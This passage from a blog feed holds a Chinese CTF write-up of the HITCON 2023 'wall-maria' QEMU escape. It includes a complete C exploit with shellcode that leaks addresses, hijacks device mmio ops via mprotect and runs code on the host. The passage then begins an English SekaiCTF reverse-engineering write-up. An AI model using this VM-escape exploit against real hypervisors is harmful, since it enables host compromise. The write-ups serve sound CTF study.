mmio_read(<span class="number">0x04</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">get_off</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mmio_read(<span class="number">0x08</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_from_buff</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_read(<span class="number">0x00</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_to_buff</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x00</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED, open(<span class="string">&quot;/dev/mem&quot;</span>,<span class="number">2</span>),<span class="number">0x00000000febd0000</span>);</span><br><span class="line">    <span class="comment">// void* tmp_buff = mmap(NULL,BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span></span><br><span class="line">    <span class="keyword">char</span> leak[BUFF_SIZE];</span><br><span class="line">    <span class="built_in">memset</span>(leak,<span class="number">0</span>,BUFF_SIZE);</span><br><span class="line">    <span class="comment">// printf(&quot;[+] %lx&quot;,get_src());</span></span><br><span class="line">    <span class="keyword">uint64_t</span> change_addr = gva2gpa(leak);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] the phy add of tmp_buff is %lx\n&quot;</span>,change_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] the phy add of tmp_buff+0x1000 is %lx\n&quot;</span>,gva2gpa((<span class="keyword">void</span>*)(leak+<span class="number">0x1000</span>)));</span><br><span class="line">    set_src(change_addr);</span><br><span class="line">    set_off((<span class="keyword">uint8_t</span>)<span class="number">0xf0</span>);</span><br><span class="line">    read_from_buff();</span><br><span class="line"></span><br><span class="line">    set_src(change_addr+BUFF_SIZE<span class="number">-0xf0</span>);</span><br><span class="line">    set_off((<span class="keyword">uint8_t</span>)<span class="number">0</span>);</span><br><span class="line">    read_to_buff();</span><br><span class="line">    <span class="comment">//泄露基址</span></span><br><span class="line">    set_src(change_addr);</span><br><span class="line">    read_from_buff();</span><br><span class="line">    <span class="keyword">uint64_t</span> offset = *((<span class="keyword">uint64_t</span>*)leak +<span class="number">17</span>)<span class="number">-0x517ae0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_base = *((<span class="keyword">uint64_t</span>*)leak) <span class="number">-0x123ad0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] the leak base is %lx\n&quot;</span>,offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] the heap base is %lx\n&quot;</span>,heap_base);</span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr = offset+SYSTEM_PLT;</span><br><span class="line">    <span class="keyword">uint64_t</span> State_addr = heap_base+<span class="number">0x1076f00</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] the State_addr is %lx\n&quot;</span>,State_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] the system_addr is %lx\n&quot;</span>,system_addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理就是首先把越界内容读到<code>change_addr</code>也就是leak对应的物理内存，然后把溢出部分再写回到buff，之后再将这溢出部分写到<code>change_addr</code>。实际上就是通过布局来将溢出的部分给提到前面去，然后再赋给<code>change_addr</code> (当然前面说过这样做很容易出问题，因为非法写了一部分物理内存)</p><p>之后就是越界写ops之类的操作了。因为我比赛中没看到沙盒所以一直打的<code>system</code>，实际上如果打ORW的话应该需要使用<code>mprotect</code>对内存区域的权限进行修改</p><p>因为我们调用<code>mmio_read/mmio_write</code>的时候，参数依次为<code>void *opaque, hwaddr addr, unsigned size</code>,后两个参数实际上是我们可控的，第一个参数我们也能通过控制结构体中的opaque来控制，所以就能对任意内存权限进行修改。</p><p>执行完之后</p><p><img src="https://s2.loli.net/2023/09/13/iGEHOJpnRau4wFl.png" alt="image-20230913201631192"></p><p>一个指向了我们的shellcode，一个指向了mprotect@plt。换言之mmio_write对应的mprotect，mmio_read对应了shellcode</p><p><img src="https://s2.loli.net/2023/09/13/hYoz9kCuLSlEX1Z.png" alt="image-20230913201707561"></p><p>使用huge page还有一个好处是我们写回buff的时候只需要对需要的地方进行更改，其他地方实际上就是我们复制来的内容，完全不需要更改。如果使用布局来搞的话还得自己恢复一下相应内容，或者计算偏移从前多少物理内存开始复制</p><p>完整exp如下，参见(<a href="https://github.com/wxrdnx/HITCON-2023-Challenges/tree/main/wall-maria/solution">HITCON-2023-Challenges/wall-maria/solution at main · wxrdnx/HITCON-2023-Challenges (github.com)</a>) </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(mmio_mem + addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">uint32_t</span> *)(mmio_mem + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_src</span><span class="params">(<span class="keyword">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x04</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x08</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_buff</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    mmio_read(<span class="number">0x00</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_buff</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x00</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva2gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> page = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[!] open error in gva2gpa\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    lseek(fd, ((<span class="keyword">uint64_t</span>)addr / PAGE_SIZE) * <span class="number">8</span>, SEEK_SET);</span><br><span class="line">    read(fd, &amp;page, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) * PAGE_SIZE) | ((<span class="keyword">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:05.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[!] Cannot open /sys/devices/pci0000:00/0000:00:05.0/resource0\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_mem = mmap(<span class="literal">NULL</span>, PAGE_SIZE * <span class="number">4</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[!] mmio error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] mmio done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set huge page</span></span><br><span class="line">    system(<span class="string">&quot;sysctl vm.nr_hugepages=32&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /proc/meminfo | grep -i huge&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buff;</span><br><span class="line">    <span class="keyword">uint64_t</span> buff_gpa;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        buff = mmap(<span class="number">0</span>, <span class="number">2</span> * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_NONBLOCK, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (buff &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[!] cannot mmap buff\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(buff, <span class="number">0</span>, <span class="number">2</span> * PAGE_SIZE);</span><br><span class="line">        buff_gpa = gva2gpa(buff);</span><br><span class="line">        <span class="keyword">uint64_t</span> buff_gpa_1000 = gva2gpa(buff + PAGE_SIZE);</span><br><span class="line">        <span class="keyword">if</span> (buff_gpa + PAGE_SIZE == buff_gpa_1000) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] buff virtual address = %p\n&quot;</span>, buff);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] buff physical address = %p\n&quot;</span>, buff_gpa);</span><br><span class="line">    </span><br><span class="line">    set_src(buff_gpa);</span><br><span class="line">    set_off(<span class="number">0xf0</span>);</span><br><span class="line">    get_buff();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> *buff_u64 = (<span class="keyword">uint64_t</span> *)buff;</span><br><span class="line">    <span class="keyword">uint64_t</span> maria_buff_addr = buff_u64[<span class="number">0x3fa</span>] - <span class="number">0x20b8</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> maria_addr = maria_buff_addr - <span class="number">0xa30</span>;</span><br><span class="line">    <span class="comment">//uint64_t qemu_base = buff_u64[0x3eb] - 0xfc26a0;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> qemu_base = buff_u64[<span class="number">0x3eb</span>] - <span class="number">0xf1ff80</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//uint64_t mprotect_plt = qemu_base + 0x31f880;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> mprotect_plt = qemu_base + <span class="number">0x30c400</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] maria-&gt;buff address = %p\n&quot;</span>, maria_buff_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] maria address = %p\n&quot;</span>, maria_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] qemu base address = %p\n&quot;</span>, qemu_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] mprotect@plt address = %p\n&quot;</span>, mprotect_plt);</span><br><span class="line"></span><br><span class="line">    buff_u64[<span class="number">0x0</span>] = maria_buff_addr + <span class="number">0x4f0</span>;</span><br><span class="line">    <span class="comment">//buff_u64[0x0] = 0xdeadbeefcafebabe;</span></span><br><span class="line">    buff_u64[<span class="number">0x1</span>] = mprotect_plt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* shellcode */</span></span><br><span class="line">    <span class="keyword">char</span> shellcode[] = &#123;</span><br><span class="line">        <span class="number">0xeb</span>, <span class="number">0x10</span>, <span class="number">0x2f</span>, <span class="number">0x68</span>, <span class="number">0x6f</span>, <span class="number">0x6d</span>, <span class="number">0x65</span>, <span class="number">0x2f</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x72</span>,</span><br><span class="line">        <span class="number">0x2f</span>, <span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x02</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x3d</span>,</span><br><span class="line">        <span class="number">0xe6</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x97</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>,</span><br><span class="line">        <span class="number">0x54</span>, <span class="number">0x5e</span>, <span class="number">0x6a</span>, <span class="number">0x70</span>, <span class="number">0x5a</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x92</span>, <span class="number">0x6a</span>, <span class="number">0x01</span>, <span class="number">0x58</span>,</span><br><span class="line">        <span class="number">0x6a</span>, <span class="number">0x01</span>, <span class="number">0x5f</span>, <span class="number">0x54</span>, <span class="number">0x5e</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x3c</span>,</span><br><span class="line">        <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;buff_u64[<span class="number">0x80</span>], shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite maria-&gt;mmio.ops and maria-&gt;mmio.opaque */</span></span><br><span class="line">    buff_u64[<span class="number">0x3ec</span>] = maria_buff_addr &amp; ~<span class="number">0xfff</span>;             <span class="comment">// maria-&gt;mmio.opaque</span></span><br><span class="line">    buff_u64[<span class="number">0x3eb</span>] = maria_buff_addr + <span class="number">0xf0</span>;               <span class="comment">// maria-&gt;mmio.ops</span></span><br><span class="line">    <span class="comment">//buff_u64[0x3eb - (maria_addr &amp; 0xfff) / 8] = maria_buff_addr + 0xf0;// (MariaState *)(maria_addr &amp; 0xfff)-&gt;mmio.ops 没要搞懂这里是要干什么，但是去掉也能跑得通</span></span><br><span class="line"></span><br><span class="line">    set_src(buff_gpa);</span><br><span class="line">    set_off(<span class="number">0xf0</span>);</span><br><span class="line">    set_buff();</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x2000</span>, <span class="number">0x7</span>);</span><br><span class="line">    mmio_read(<span class="number">0x0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;蛤蛤，有蠢比做qemu逃逸没看见&lt;code&gt;-sandbox on&lt;/code&gt;，做了半天以为调通了结果发现爆了&lt;code&gt;bad syscall&lt;/code&gt; 。唐完了(我有抑郁症)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;军训完的第一个周末，</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
    <category term="wp" scheme="http://phot0n.com/tags/wp/"/>
    
    <category term="ctf" scheme="http://phot0n.com/tags/ctf/"/>
    
    <category term="re" scheme="http://phot0n.com/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>WriteUps for some problems in SekaiCTF-2023</title>
    <link href="http://phot0n.com/2023/08/29/WriteUps-for-some-problems-in-SekaiCTF-2023/"/>
    <id>http://phot0n.com/2023/08/29/WriteUps-for-some-problems-in-SekaiCTF-2023/</id>
    <published>2023-08-29T03:54:14.000Z</published>
    <updated>2023-08-30T12:32:42.957Z</updated>
    
    <content type="html"><![CDATA[<p>last weekend , I take part in the SekaiCTF-2023 and solve some easy challenges.On the last day night, I spend most of time on the challenge called <code>Sahuang Flag Checker</code>.I get the main algorithms by reversing,but for some reason I overthink the problem and didn’t realize that It’s just a simple problem :(</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Sahuang-Flag-Checker"><a href="#Sahuang-Flag-Checker" class="headerlink" title="Sahuang Flag Checker"></a>Sahuang Flag Checker</h2><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p><img src="https://s2.loli.net/2023/08/30/SIg78FqUCPTpLsn.png" alt="image-20230830202624565"></p><h3 id="Emulate"><a href="#Emulate" class="headerlink" title="Emulate"></a>Emulate</h3><p>To run this file,your cpu need to support AVX-512.Or you will get some info like <code>illegal instruction</code> .I try 3 methods to run it. First I try to use <code>unicorn</code> to emulate it , but It seems it don’t support AVX-512 too.(Although I find the info on the github issue page of unicorn,ones say that it support AVX-512.but , any way , I can’t run it.If some one know how to use it , please tell me)</p><p><img src="https://s2.loli.net/2023/08/29/pUJDSlNuYzgkOx9.png" alt="image-20230829174051968"></p><p>later I try to use <code>QEMU</code> to run this binary , but I can’t find some guide to tell me how to support AVX-512 on QEMU . While I  find the same question on <code>stackoverflow</code> ,and says that the tools called <code>SDE</code> may help. So I download this tools and find I can’t run it. I get the error info like <code>SDE ERROR: Could not find base path for</code>.Change the environment variables didn’t help. I search a lot but can solve it.Yep , I didnt notice the file called <code>sde64</code> (f**k ),and It can run.When I can run the binary,I only got 3 hours left. :(</p><p>You can launch two terminal, one run this command</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sde-external-9.24.0-2023-07-13-lin/sde64 -icl -debug --  ./sahuang</span><br></pre></td></tr></table></figure><p>it will tell you the post (info like</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Start GDB, then issue this command at the (gdb) prompt:</span><br><span class="line">  target remote :60633</span><br></pre></td></tr></table></figure><p> )</p><p>and one run gdb-multiarch to connect.</p><p>I don’t know why,My pwndbg and gef failed to work.So I can only use the primary gdb to debug it. It’s painful</p><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>It is clear that in this part,the file sacnf the flag string and pad it to 16-byte.It is stored in v31.</p><p> <img src="https://s2.loli.net/2023/08/29/wKqYzAco8kI7eS9.png" alt="image-20230829175502662"></p><p>And ,in this part, It handle the flag string 16 bytes by 16 bytes (My English is pool, I want to express that it handle the first 16 bytes and the next 16bytes, and so on)</p><p>On each cycle, firstly the flag string to be handled is passed to a function called <code>rc</code> and stored in <code>v28</code>.</p><p>And <code>v28</code> is passed to <code>matmult_SSE4</code> (It may relative to matrix mult judged by its function name.I debug it in case the author change something in the matrix mult funciton.) and the result is stored in v29</p><p>Later,  after two <code>mul</code> and one <code>sub</code> and one <code>add</code> ,the flag string is changed to something like ciphertext.</p><p>We need to recover the flag by the ciphertext</p><p><img src="https://s2.loli.net/2023/08/29/trSbF5G3gcuYmWQ.png" alt="image-20230829175714938"></p><h4 id="rc"><a href="#rc" class="headerlink" title="rc"></a>rc</h4><p>first ,Let ‘ s analysis the function called <code>rc</code> .I analysis it staticly.Actually,it has a lot of junk code.And in function <code>mul</code> and function <code>sub</code> and function <code>add</code>,there are a lot of junk code of the same style like this.</p><p>It receive two parameter, one <code>char</code> and one <code>int</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">rc</span><span class="params">(<span class="keyword">char</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v41; <span class="comment">// [rsp+8h] [rbp-130h]</span></span><br><span class="line">  <span class="keyword">char</span> v42; <span class="comment">// [rsp+9h] [rbp-12Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v43; <span class="comment">// [rsp+Ah] [rbp-12Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v44; <span class="comment">// [rsp+Bh] [rbp-12Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v45; <span class="comment">// [rsp+10h] [rbp-128h]</span></span><br><span class="line">  <span class="keyword">int</span> v46; <span class="comment">// [rsp+14h] [rbp-124h]</span></span><br><span class="line"></span><br><span class="line">  v44 = a1;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    vpbroadcastb xmm0, [rbp+var_12D]</span><br><span class="line">    vmovdqa [rbp+var_120], xmm0</span><br><span class="line">  &#125;</span><br><span class="line">  v43 = <span class="number">0xF0</span>;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    vpbroadcastb xmm0, [rbp+var_12E]</span><br><span class="line">    vmovdqa xmm1, xmm0</span><br><span class="line">    vmovdqa xmm0, [rbp+var_120]</span><br><span class="line">    vmovdqa [rbp+var_20], xmm0</span><br><span class="line">    vmovdqa [rbp+var_10], xmm1</span><br><span class="line">    vmovdqa xmm1, [rbp+var_20]</span><br><span class="line">    vmovdqa xmm0, [rbp+var_10]</span><br><span class="line">    vpand   xmm0, xmm1, xmm0</span><br><span class="line">    vmovdqa [rbp+var_F0], xmm0</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>We notice that the <code>v44</code>(the int parameter we pass in) is stored in <code>[rbp-12Dh]</code> and it store the parameter <code>a1</code>,  In the first asm block, It is passed to <code>xmm0</code> and then stored in <code>[rbp-120h]</code> . In the second asm block,the content in <code>[rbp+var_12E]</code>  (Actually the <code>v43</code>)is passed to <code>xmm0</code> and then passed to <code>xmm1</code>, and the content in <code>[rbp+var_120h]</code>(which is the <code>v44</code>,or the <code>a1</code> we pass) . And we get <code>xmm1 &amp; xmm2</code> by the code <code>vpand   xmm0, xmm1, xmm0</code> . The result is stored in <code>[rbp+var_F0]</code>. So this part we get <code>a1&amp;f0</code> (the highest 4 bit of a1)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v42; <span class="comment">// [rsp+9h] [rbp-12Fh]  </span></span><br><span class="line">v42 = <span class="number">0xF</span>;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    vpbroadcastb xmm0, [rbp+var_12F]</span><br><span class="line">    vmovdqa xmm1, xmm0</span><br><span class="line">    vmovdqa xmm0, [rbp+var_120]</span><br><span class="line">    vmovdqa [rbp+var_40], xmm0</span><br><span class="line">    vmovdqa [rbp+var_30], xmm1</span><br><span class="line">    vmovdqa xmm1, [rbp+var_40]</span><br><span class="line">    vmovdqa xmm0, [rbp+var_30]</span><br><span class="line">    vpand   xmm0, xmm1, xmm0</span><br><span class="line">    vmovdqa [rbp+var_E0], xmm0</span><br><span class="line">    vmovdqa xmm0, [rbp+var_E0]</span><br><span class="line">    vmovdqa [rbp+var_50], xmm0</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>Similarly ,we get the <code>a1&amp;0x0f</code> (the lowest 4 